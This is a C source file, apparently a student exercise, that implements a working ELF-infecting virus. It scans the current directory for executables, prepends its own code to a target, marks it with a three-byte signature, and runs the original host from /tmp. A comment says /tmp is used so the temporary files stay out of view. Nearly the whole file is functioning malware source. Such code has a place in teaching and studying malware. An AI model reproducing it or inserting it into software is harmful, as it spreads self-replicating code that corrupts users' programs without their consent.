//
//  virus.c
//
//
//  Created by William Hreiki on 4/21/20.
//
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <sys/wait.h>

#define FILESIZE 14056

//check for virus
bool isVirus(char filename[]) {
    FILE *fp;
    char ch;
    int num = 3;
    long length;
    int i = 0;
    int compare[3] = {42,13,37};

    fp = fopen(filename, "r");
    
    fseek(fp, 0, SEEK_END);
    length = ftell(fp);
    fseek(fp, (length - num), SEEK_SET);
    
    do {
        ch = fgetc(fp);
        if (i < 3){
            if (compare[i++] != ch){
                return false;
            }
        }
    } while (ch != EOF);
    fclose(fp);
    return true;
}

/*
* checks if valid ELF exe & not already infected
* if chars exist in file header is "ELF" then elf
*/
bool isValidTarget(char filename[], char virus[]) {
    FILE *fp;
    char ch[4]; // create a buffer to include ELF & null
    
    struct stat st;
    stat(filename, &st);
    if (S_ISDIR(st.st_mode)) {
        return 0;
    }
    
    fp=fopen(filename,"r");
    char one[4] = {0x7f,'E','L','F'}; // for comparison
    bool valid = false;
    
    fread(ch, sizeof(char),4,fp);
    ch[4] = '\0'; // null terminate
    
    char *a = ch; //before comparison, create pointer to remove first 0x7F "magic byte"
    
    // is ELF file?
    if(strncmp(one, a, sizeof(one)) == 0)
        valid = true;
    
    fclose(fp);

    //final check - valid target & not infected(yet)
    if (valid && !isVirus(filename))
        return true;
    else {
        return false;
    }
}

// combine the resources
void concat(char virusFile[], char targetFile[], int isOriginal){
    FILE *fs1, *fs2, *ft;
    struct stat st;
    int count = 0;
    
    char file3[20];
    int ch;

    fs1 = fopen(virusFile, "r");
    fs2 = fopen(targetFile, "r");
    ft = fopen("/tmp/infect", "w");

    // copying contents of file
    while((ch = fgetc(fs1)) != EOF){
        if (isOriginal) {
            fputc(ch,ft);
        }
        if(!isOriginal) {
            if (count < FILESIZE) {
                fputc(ch,ft);
            }
        }count++;
    }
    while((ch = fgetc(fs2)) != EOF)
        fputc(ch,ft);
    
    // add signature
    fputc(42,ft);
    fputc(13,ft);
    fputc(37,ft);

    fclose(fs1);
    fclose(fs2);
    fclose(ft);
    
    // applying correct permissions to new temp file
    stat(targetFile, &st);
    chmod("/tmp/infect", st.st_mode);
    
    remove(targetFile);
    fs1 = fopen("/tmp/infect", "r");
    fs2 = fopen(targetFile, "w");
    
    while((ch = fgetc(fs1)) != EOF)
        fputc(ch,fs2);
    
    // applying correct permissions to resulting file
    stat("/tmp/infect", &st);
    chmod(targetFile, st.st_mode);
    
    fclose(fs1);
    fclose(fs2);
    // deleting temp file when done
    remove("/tmp/infect");
}

void executeOriginal(char **argv) {
    FILE *fs1, *ft;
    int ch;
    int localCount = 0;
    struct stat st;
    
    // using /tmp directory so ls doesn't see temp files
    fs1 = fopen(argv[0], "r");
    ft = fopen("/tmp/infectAgain", "w");

    while((ch = fgetc(fs1)) != EOF) {
        if(localCount >= FILESIZE){
            fputc(ch,ft);
        } localCount++;
    }
    
    fclose(ft);
    
    //correct permissions
    stat(argv[0], &st);
    chmod("/tmp/infectAgain", st.st_mode);
    
    pid_t i = fork();
    if (i == 0)
    {
        execv("/tmp/infectAgain", argv);
        exit(0);
    }
    else{
        //wait or else infectAgain is not run
        waitpid(i, 0, 0);

    }

    // delete file when done
    remove("/tmp/infectAgain");
}

//main implement
int main(int argc, char **argv) {
    DIR *d;
    struct dirent *dir;
    FILE* ElfFile = NULL;
    char checkTwo[] = "virus";
    char *check = argv[0];
    check++;
    check++;
    d = opendir(".");
    printf("Hello! I am a simple virus!\n");
    
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            if (access(dir->d_name, R_OK) == 0 ) { // does file have permissions to access?
                if(isValidTarget(dir->d_name, check) && strncmp(dir->d_name, checkTwo, sizeof(checkTwo)) != 0) {
                    
                    //not original
                    if(strncmp(check, checkTwo, sizeof(check)) != 0){
                        concat(argv[0], dir->d_name, 0); // combine files
                    
                    }
                    //original
                    if (strncmp(check, checkTwo, sizeof(check)) == 0) {
                        concat(argv[0], dir->d_name, 1); // combine files
                    }
                    
                    break;
                }
            }
        }
        // dont run on origional virus.c file
        if (strncmp(checkTwo, check, sizeof(check)) != 0){
            executeOriginal(argv); // execute old file
        }
        closedir(d);
    }
    return(0);
}
